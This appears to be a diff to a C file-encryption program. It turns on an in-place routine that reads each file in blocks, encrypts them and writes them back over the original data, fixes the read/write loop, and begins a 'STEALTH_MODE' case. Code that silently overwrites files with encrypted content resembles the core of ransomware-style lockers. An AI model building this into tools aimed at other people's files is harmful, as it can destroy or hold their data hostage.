@@ -35,27 +35,28 @@ void encrypt_buffer(char buffer[], int buflen) {
 
 //Execute an encryption action on a single file, varying by mode.
 int encrypt_file(crypt_mode_t mode, char *filename) {
-  fprintf(stderr, "Working on: %s\n", filename);
-//  newfilename = filename
   FILE* fp_r;
   FILE* fp_w;
   int num_r;
   int num_w;
+  bool eof = false;
   char buf[2097152];
+  fprintf(stderr, "Working on: %s\n", filename);
+//  newfilename = filename
   switch (mode) {
     case SEEK_MODE:
       fprintf(stderr, "Seek mode detected ...\n");
       fp_w = fopen(filename, "rb+");
       if (fp_w == NULL) return EXIT_FAILURE;
-      while (!feof(fp_w)) {
-        num_r = fread(buf, sizeof(buf), 1, fp_w);
-        hexprint_array(buf, sizeof(buf)/sizeof(buf[0]));
-/*        encrypt_buffer(buf, sizeof(buf)/sizeof(buf[0]));
+      while (!eof) {
+        num_r = fread(buf, 1, sizeof(buf), fp_w);
+        encrypt_buffer(buf, sizeof(buf)/sizeof(buf[0]));
         fseek(fp_w, -num_r, SEEK_CUR);
-        num_w = fwrite(buf, sizeof(buf), 1, fp_w);
+        if (num_r < sizeof(buf)/sizeof(buf[0])) { eof = true; }
+        num_w = fwrite(buf, 1, num_r, fp_w);
         if (num_r != num_w ) {
           fprintf(stderr, "Mismatched read and write!\n");
-        }*/
+        }
       }
     break;
     case STEALTH_MODE:
